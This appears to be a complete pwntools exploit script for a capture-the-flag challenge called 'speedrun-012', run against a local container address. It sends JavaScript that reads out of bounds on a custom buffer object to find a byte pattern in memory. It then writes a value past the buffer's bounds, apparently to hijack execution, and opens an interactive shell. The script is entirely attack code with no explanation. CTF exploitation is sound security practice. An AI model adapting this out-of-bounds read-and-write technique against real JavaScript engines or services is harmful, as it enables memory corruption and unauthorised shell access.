from pwn import *

# r = process("./speedrun-012")
# pause()
r = remote("172.17.0.2", 31337)
js = """
var buf = new OOOBufferOOO(64);
var good = 0;
for(var i = 39000; i < 41000; i++) {
	if(buf.readUInt8(i) === 0x70 && buf.readUInt8(i+1) === 0xa2) {
		good = i;
		break;
	}	
}
buf.writeInt32LE(0x20000000, good-3);
print("/bin/sh");
"""

r.send(js)
r.interactive()
